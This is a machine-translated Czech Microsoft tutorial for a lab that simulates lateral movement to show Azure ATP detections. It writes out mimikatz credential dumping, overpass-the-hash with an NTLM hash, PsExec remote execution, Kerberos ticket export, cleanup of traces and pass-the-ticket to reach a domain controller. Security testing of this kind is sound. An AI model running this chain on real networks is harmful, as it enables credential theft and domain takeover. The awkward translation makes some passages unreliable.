---
title: Playbook taktiky Lateral Movement výstrah zabezpečení ochrany ATP v programu Azure | Dokumentace Microsoftu
description: Playbook Azure ATP popisuje, jak simulovat taktiky Lateral Movement hrozeb pro zjišťování pomocí služby Azure ATP.
ms.service: azure-advanced-threat-protection
ms.topic: tutorial
author: mlottner
ms.author: mlottner
ms.date: 02/28/2019
ms.reviewer: itargoet
ms.openlocfilehash: 556ec9d8eb8cfa06131adf2c94b032e378edb714
ms.sourcegitcommit: 4711f0ff4331e0bcc84663f46054216b7db9f98e
ms.translationtype: MT
ms.contentlocale: cs-CZ
ms.lasthandoff: 02/28/2019
ms.locfileid: "56989080"
---
# <a name="tutorial-lateral-movement-playbook"></a>Kurz: Playbook taktiky Lateral Movement

Playbook taktiky Lateral Movement je třetí nástroj v čtyř částí série kurzů pro výstrahy zabezpečení služby Azure ATP. Účelem ochrany ATP v programu Azure testovacího prostředí výstrahy zabezpečení je pro ilustraci **ochrany ATP v programu Azure**možnosti v identifikace a detekce podezřelých aktivit a potenciální útoky na vaší síti. Playbook vysvětluje, jak testujeme funkčnost ve některé služby Azure ATP *diskrétní* detekcí. Playbook se soustředí na služby Azure ATP *podpis*– na základě možnosti a nezahrnuje rozšířené strojové učení, uživatele nebo entity chování tématu detekce na základě (vyžadují období učení s skutečné síťový provoz pro až pro 30 dnů). Další informace o jednotlivých kurzu této série najdete v článku [přehled výstrah laboratoře zabezpečení ochrany ATP v programu](atp-playbook-lab-overview.md).

Playbook jsou uvedeny některé laterální pohyb cesta detekce hrozeb a výstrahy zabezpečení podle tak napodobuje útoku s nástroji pro běžné každodenní praxe, veřejně dostupné hackerů a útoku služby Azure ATP.

V tomto kurzu provedete následující:
> [!div class="checklist"]
> * Získejte hodnot hash protokolů NTLM a simulace útoku Overpass-the-Hash k získání protokolu Kerberos lístku pro přidělování lístků (TGT).
> * Maskovat jako jiný uživatel, následně k laterálnímu pohybu v síti a získejte další přihlašovací údaje.
> * Simulace útoku Pass-the-Ticket k získání přístupu k řadiči domény.
> * Zkontrolujte výstrahy zabezpečení z laterální pohyb v ochrany ATP v programu Azure.

## <a name="prerequisites"></a>Požadavky

1. [Dokončení ochrany ATP v programu zabezpečení oznámení testovacího prostředí](atp-playbook-setup-lab.md) 
     - Co možná nejvíce doporučujeme postupujte podle pokynů pro nastavení testovacího prostředí. Čím blíž testovacího prostředí je nastavení navrhované testovacího prostředí, tím snazší bude dodržovat testovacích postupů ochrany ATP v Azure.

2. [Dokončení kurzu rekognoskace playbook](atp-playbook-reconnaissance.md)

## <a name="lateral-movement"></a>Laterální pohyb

Naše útoky Simulovaná v předchozím kurzu, rekognoskace playbooku, jsme získali informace rozsáhlé sítě. Pomocí těchto informací, je Naším cílem v průběhu této fáze taktiky Lateral Movement testovacího prostředí získání IP adresy kritická hodnota už zjistili jsme a zobrazovat výstrahy služby Azure ATP pohybu. V předchozí simulace prostředí Rekognoskace myslíme, že 10.0.24.6 jako cílová IP adresa, která byla ve kterém byly zveřejněny přihlašovací údaje pro SamiraA počítače. Společnost Microsoft bude napodobovat různých metod útoku zvýšit se pokouší následně k laterálnímu pohybu napříč doménou.

## <a name="dump-credentials-in-memory-from-victimpc"></a>Vypsat přihlašovací údaje v paměti z VictimPC

Během naší útoky mock rekognoskace **VictimPC** nebyla dostupná jenom v případě přihlašovacích údajů JeffL společnosti. Existují jiné účty užitečné ke zjištění na tomto počítači. K dosažení boční přesunout pomocí **VictimPC**, pokusíme se vytvořit výčet přihlašovací údaje v paměti u sdíleného prostředku. Výpis přihlašovacích údajů v paměti **mimikatz** je metoda oblíbených útok pomocí běžných nástrojů.

### <a name="mimikatz-sekurlsalogonpasswords"></a>Nástroj Mimikatz sekurlsa::logonpasswords

1. Otevřít **řádku se zvýšenými oprávněními příkaz** na **VictimPC**. 
2. Přejděte do složky nástroje, kam jste uložili nástroj Mimikatz a spusťte následující příkaz:

   ``` cmd
   mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\temp\victimcpc.txt
   ```

3. Otevřít **c:\\temp\\victimpc.txt** zobrazíte získaného pověření Mimikatz nalezen a byl zapsán do souboru txt.
   ![Nástroj Mimikatz výstup včetně hodnoty hash NTLM RonHD](media/playbook-lateral-sekurlsa-logonpasswords-output.png)

4. Úspěšně jsme získaných hodnoty hash NTLM RonHD z paměti pomocí mimikatz. Hodnoty hash NTLM budeme potřebovat za chvíli.

   > [!Important]
   > - Očekává se a běžné, že se liší od hodnoty hash hodnoty hash v tomto příkladu se zobrazí ve vlastním testovacím prostředí. Účelem tohoto cvičení je vám pomohou pochopit, jak byly získány hodnoty hash, získávají hodnoty a jejich použití v další fáze. </br> </br>
   > - Přihlašovací údaje účtu počítače se také zobrazuje v tomto harvestu. Hodnoty přihlašovacích údajů účtu počítače není užitečný v našem aktuálním testovacím prostředí, mějte na paměti, že jde o jiný zacházíme skutečné útočníci používají k získání taktiky Lateral Movement ve vašem prostředí.

### <a name="gather-more-information-about-the-ronhd-account"></a>Získat další informace o účtu RonHD

Útočník nemusí vědět zpočátku kdo je nebo jeho hodnotu jako cíl. Všechny, které znají, můžete použít přihlašovací údaje, pokud je výhodné Uděláte to tak je. Avšak použití **net** příkaz jsme funguje jako útočník, můžete zjistit, jaké skupiny je členem skupiny.

Z **VictimPC**, spusťte následující příkaz:

   ``` cmd
   net user ronhd /domain
   ```

![Rekognoskace proti účtu uživatele RonHD](media/playbook-lateral-sekurlsa-logonpasswords-ronhd_discovery.png)

Ve výsledcích Učíme je členem "Helpdesku" skupina zabezpečení. Víme, že RonHD jsme získali oprávnění, které jsou součástí účtu *a* pomocí skupiny zabezpečení Helpdesk.

### <a name="mimikatz-sekurlsapth"></a>Nástroj Mimikatz sekurlsa::pth

Pomocí běžná technika se nazývá **Overpass-the-Hash**, získaného hodnoty hash NTLM se používá k získání lístku pro přidělování lístků (TGT). Útočník s lístek TGT, můžete maskovat jako uživatel ohrožení zabezpečení, jako je například RonHD. Při ho maskují za RonHD, jsme můžete přístup ke všem prostředkům v doméně, který má přístup k ohrožení uživatelských nebo mají přístup k jejich odpovídajících skupin zabezpečení.

1. Z **VictimPC**, změňte adresář na složku obsahující **Mimikatz.exe**. umístění úložiště na váš systém souborů a spusťte následující příkaz:

   ``` cmd
   mimikatz.exe "privilege::debug" "sekurlsa::pth /user:ronhd /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:contoso.azure" "exit"
   ```

   > [!Note]
   > Pokud vaše hash pro RonHD se liší v předchozích krocích, nahraďte hodnoty hash NTLM nad-the-hash shromážděných z *victimpc.txt*.

   ![Overpass-the-hash přes nástroj mimikatz](media/playbook-lateral-opth1.png)

2. Zkontrolujte, že nový příkazový řádek se otevře. To se provádí jako RonHD, ale který se může zdát zřejmé *ještě*. Nezavírejte nového příkazového řádku, protože se bude dále používat.

Ochrana ATP v programu Azure nerozpozná hash předány místního prostředku. Ochrana ATP v programu Azure rozpozná, pokud je hodnota hash **používá z jednoho prostředku pro přístup k jiné** prostředku nebo službě.

### <a name="additional-lateral-move"></a>Další laterální přesunutí

Nyní s přihlašovacími údaji uživatele RonHD, se nám můžete předávat přístupu, které dříve nebyly k dispozici s přihlašovacími údaji vaší JeffL?
Použijeme **PowerSploit** ```Get-NetLocalGroup``` pro odpověď, která.

1. V příkazové konzole, které se otevřelo z důvodu naše předchozí útoku, spuštěná jako RonHD spusťte následující položky:

   ``` PowerShell
   powershell
   Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
   Import-Module C:\tools\PowerSploit\PowerSploit.psm1 -Force
   Get-NetLocalGroup 10.0.24.6
   ```

   ![Získat místní správci pro 10.0.24.6 prostřednictvím nástroje PowerSploit](media/playbook-lateral-adminpcsamr.png)

   Na pozadí používá vzdáleného SAM k identifikaci místní správci pro IP adresu dříve zjistili jsme, která byla vystavena účtu správce domény.

   Naše výstup bude vypadat podobně jako:

   ![Výstup PowerSploit Get-NetLocalGroup](media/playbook-lateral-adminpcsamr_results.png)

   Tento počítač má dvě místní správci, předdefinovaného účtu Administrator "ContosoAdmin" a "Helpdesku". Víme, že je členem "Helpdesku" skupina zabezpečení. Také se řekli jsme název počítače, AdminPC. Vzhledem k tomu, že máme RonHD pověření, jsme by měl být možné použít k laterálnímu přesunout do AdminPC a získat přístup k tomuto počítači.

2. Z *stejného příkazového řádku, který je spuštěn v kontextu RonHD*, typ **ukončit** získat z prostředí PowerShell v případě potřeby. Potom spusťte následující příkaz:

   ``` cmd
   dir \\adminpc\c$
   ```

3. Budeme úspěšně otevřela AdminPC. Podívejme se na jaké lístky máme k dispozici. Na stejném příkazovém řádku spusťte následující příkaz:

   ``` cmd
   klist
   ```

   ![Použijte příkaz zobrazí se nám lístky protokolu Kerberos v našem aktuálním procesu cmd.exe](media/playbook-lateral-klist.png)

Uvidíte, že pro tento konkrétní proces máme RonHD lístku TGT v paměti. Úspěšně jsme provedli útoku Overpass-the-Hash v našem testovacím prostředí. Můžeme převést hodnotu hash NTLM, která byla dříve k ohrožení a použít ho k získání lístky TGT protokolu Kerberos Tento lístek TGT protokolu Kerberos se pak použije k získání přístupu k jinému síťovému prostředku, v tomto případě AdminPC. 

### <a name="overpass-the-hash-detected-in-azure-atp"></a>Overpass-the-Hash v Azure ATP

Vyhledávání v konzoli ochrany ATP v programu Azure, můžeme vidět následující věci:

![AATP zjištění útoku Overpass-the-Hash](media/playbook-lateral-opthdetection.png)

Ochrana ATP v programu Azure zjistil, že byl účtu uživatele RonHD dojde k ohrožení bezpečnosti na VictimPC a pak použije k získání úspěšně lístky TGT protokolu Kerberos Když kliknete na název RonHD ve výstraze, jsme přejdete tak časové osy aktivity logické RonHD, kde jsme dále šetřením.

![Zobrazit zjištění na časové ose logické aktivity](media/playbook-lateral-opthlogicalactivity.png)

Naše analytik zabezpečení ve službě Security Center operace, je informován o ohrožení zabezpečení přihlašovacích údajů a můžete rychle zjistit prostředky k němu získat přístup.

## <a name="domain-escalation"></a>Eskalace do domény

Naše simulované útoky právě nemáme přístup k AdminPC, jsme ověřili na AdminPC oprávnění správce. Jsme teď můžete následně k laterálnímu přesunout do AdminPC a získejte další přihlašovací údaje.

Tady provedeme následující:

* Fáze Mimikatz na AdminPC
* Shromáždit hodnotná lístky na AdminPC
* Pass-the-Ticket se SamiraA

### <a name="pass-the-ticket"></a>Útok typu Pass-the-Ticket

Z příkazového řádku spuštěného v kontextu sady *RonHD* na **VictimPC**, přejděte k umístění našich běžných nástrojů útoku. Potom spusťte xcopy přesunete AdminPC tyto nástroje:

``` cmd
xcopy mimikatz.exe \\adminpc\c$\temp
```

Stisknutím klávesy ```d``` po zobrazení výzvy s informacemi o tom, že složka "temp" je adresář na AdminPC.

![Zkopírujte soubory do AdminPC](media/playbook-escalation-xcopy1.png)

### <a name="mimikatz-sekurlsatickets"></a>Nástroj Mimikatz sekurlsa::tickets

V rámci fázované na AdminPC nástroj Mimikatz využíváme PsExec vzdálené spuštění.

1. Procházení k umístění PsExec a spusťte následující příkaz:

   ``` cmd
   PsExec.exe \\AdminPC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit")
   ```

   Že příkaz spustí a exportovat lístky součástí LSASS.exe zpracování a umístit je do aktuálního adresáře na AdminPC.

2. Potřebujeme kopírování lístky přecházet do VictimPC z AdminPC. Od nás zajímá jenom na SamiraA lístky pro účely tohoto příkladu, spusťte následující příkaz:

   ``` cmd
   xcopy \\adminpc\c$\temp\*SamiraA* c:\temp\adminpc_tickets
   ```

   ![Export získaného přihlašovacích údajů z AdminPC zpět do VictimPC](media/playbook-escalation-export_tickets2.png)

3. Umožňuje vyčistit naše stopy AdminPC odstraněním našich souborů.

   ``` cmd
   rmdir \\adminpc\c$\temp /s /q
   ```

   > [!Note]
   > Složitější útočníci nebude touch disku, při spuštění libovolného kódu na počítači po získání oprávnění správce na něm.

   Na našem **VictimPC**, máme tyto lístky získaného v našich **c:\temp\adminpc_tickets** složky:

   ![C:\temp\tickets je naše exportované mimikatz výstup z AdminPC](media/playbook-escalation-export_tickets4.png)


### <a name="mimikatz-kerberosptt"></a>Nástroj Mimikatz Kerberos::ptt

S lístky na VictimPC místně je nakonec čas stát SamiraA podle "Předání the Ticket".

1. Z umístění **Mimikatz** na **VictimPC**v systému souborů, otevřete novou **příkazový řádek se zvýšenými oprávněními**a spusťte následující příkaz:

   ``` cmd
   mimikatz.exe "privilege::debug" "kerberos::ptt c:\temp\adminpc_tickets" "exit"
   ```

   ![Importovat do procesu cmd.exe odcizených lístků](media/playbook-escalation-ptt1.png)

2. V stejný řádek se zvýšenými oprávněními příkaz ověřte, že jsou správné lístky v relaci příkazového řádku. Spusťte následující příkaz:

   ``` cmd
   klist
   ```

   ![Spusťte příkaz Zobrazit importované lístky v procesu CMD](media/playbook-escalation-ptt2.png)

3. Všimněte si, že tyto lístky nepoužíval. Funguje jako útočník, budeme úspěšně "předáno-the-ticket". Jsme získaných od SamirA přihlašovacích údajů z AdminPC a pak je předána na jiný proces běžící na VictimPC.

   > [!Note]
   > Jako v Pass-the-Hash, neví, ochrana ATP v programu Azure byl předán-the-ticket závislosti na aktivitě místního klienta. Ale ochrany ATP v programu Azure zjistí aktivita *po-the-ticket slouží*, tedy využít pro přístup k jiné prostředku/služby.

4. Dokončení simulované útoku přístupu k řadiči domény z **VictimPC**. Aktuálně spuštěno s lístky SamirA v paměti, v příkazovém řádku spusťte:

   ``` cmd
   dir \\ContosoDC\c$
   ```

   ![Přístup c:\ jednotky ContosoDC pomocí přihlašovacích údajů SamirA.](media/playbook-escalation-ptt3.png)

Úspěch! Prostřednictvím našich mock útoků jsme získali přístup správce na naše řadiči domény a úspěšně tím bylo narušeno naše laboratorní Active Directory doména nebo doménová struktura.

### <a name="pass-the-ticket-detection-in-azure-atp"></a>Předejte detekce lístku služby Azure ATP

Většina nástrojů zabezpečení nemají žádnou možnost zjistit, kdy legitimní pověření byla použita k přístupu k prostředkům legitimní. Naproti tomu ochrany ATP v programu Azure k čemu detekovat a upozornění na v tomto řetězci události?

- Ochrana ATP v programu Azure zjistil krádež Samira lístky z AdminPC a přesun do VictimPC.
- Na portálu ochrany ATP v programu Azure se zobrazí přesně které prostředky byly přístupné pomocí odcizených lístků.
- Poskytuje informace o klíči a důkazy pro identifikaci přesně kde začít šetření a jaké nápravné kroky.

Azure detekce ochrany ATP v programu a informace o výstrahách jsou kritické hodnoty pro každý tým digitálních forenzních Incident odpovědi (DFIR). Můžete nejen naleznete v tématu krádeže přihlašovacích údajů, ale také zjistěte, jaké prostředky odcizených lístků se používají pro přístup k ohrožení.

![Ochrana ATP v programu Azure Pass-the-Ticket zjistí pomocí dvou hodin potlačení](media/playbook-escalation-pttdetection.png)

> [!NOTE]
> Tato událost se zobrazí jenom v konzole služby Azure ATP v **2 hodiny**. Události tohoto typu jsou potlačeny záměrně pro tohoto časového rámce a snížil počet falešných poplachů.

## <a name="next-steps"></a>Další postup
V další fázi v řetězu událostí útoku je dominance v doméně.

> [!div class="nextstepaction"]
> [Playbook Azure Dominance v doméně ochrany ATP v programu](atp-playbook-lateral-movement.md)

## <a name="join-the-community"></a>Připojte se ke komunitě

Máte další dotazy nebo zájem o diskuze o ochrany ATP v programu Azure a souvisejícího zabezpečení s ostatními? Připojte se k [komunita ochrany ATP v programu Azure](https://techcommunity.microsoft.com/t5/Azure-Advanced-Threat-Protection/bd-p/AzureAdvancedThreatProtection) ještě dnes!
